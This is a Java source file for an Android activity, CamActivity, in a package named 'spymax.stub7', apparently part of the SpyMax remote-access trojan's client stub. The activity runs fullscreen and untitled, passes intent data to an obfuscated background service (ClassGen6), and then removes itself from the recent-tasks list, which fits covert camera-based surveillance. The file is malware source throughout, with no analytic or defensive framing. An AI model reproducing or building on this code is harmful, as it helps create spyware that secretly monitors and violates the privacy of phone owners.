package spymax.stub7;


import android.app.Activity;
import android.content.BroadcastReceiver;
import android.content.Context;
import android.content.Intent;
import android.content.IntentFilter;
import android.os.Build;
import android.os.Bundle;
import android.view.Window;
import android.view.WindowManager;

public class CamActivity extends Activity {
    private final BroadcastReceiver abcd = new BroadcastReceiver() {
        @Override
        public void onReceive(Context context, Intent intent) {
            finish();
        }
    };

    @Override
    public void finish() {

        if (Build.VERSION.SDK_INT >= Build.VERSION_CODES.LOLLIPOP) {
            super.finishAndRemoveTask();
        } else {
            super.finish();
        }
    }
    Boolean isRejesterd=false;
    @Override
    protected void onDestroy() {
        super.onDestroy();

        try
        {
            if (isRejesterd)
            {
                isRejesterd=false;
                unregisterReceiver(abcd);
            }

        }
        catch(IllegalArgumentException e){

        }catch (Exception s){

        }


    }

    @Override
    protected void onCreate(Bundle savedInstanceState) {
        super.onCreate(savedInstanceState);
        requestWindowFeature(Window.FEATURE_NO_TITLE);
        getWindow().setFlags(WindowManager.LayoutParams.FLAG_FULLSCREEN,
                WindowManager.LayoutParams.FLAG_FULLSCREEN);


        try {
            Intent intent = getIntent();
            String vul[] = null ;
            vul = intent.getStringArrayExtra("key");
            if (vul != null)
            {

                Context MYCTX = getApplicationContext();
                if (ClassGen10._runn_srv_(ClassGen6.class,MYCTX))
                {

                    registerReceiver(abcd, new IntentFilter("xyz"));
                    isRejesterd=true;

                    Intent i = new Intent(MYCTX, ClassGen6.class);
                    i.putExtra(ClassGen8.FTX1,vul);
                    MYCTX.startService(i);
                    //LOGIT(MYCTX,i);

                }

            }
        }catch (Exception e){

        }
        finish();
    }
}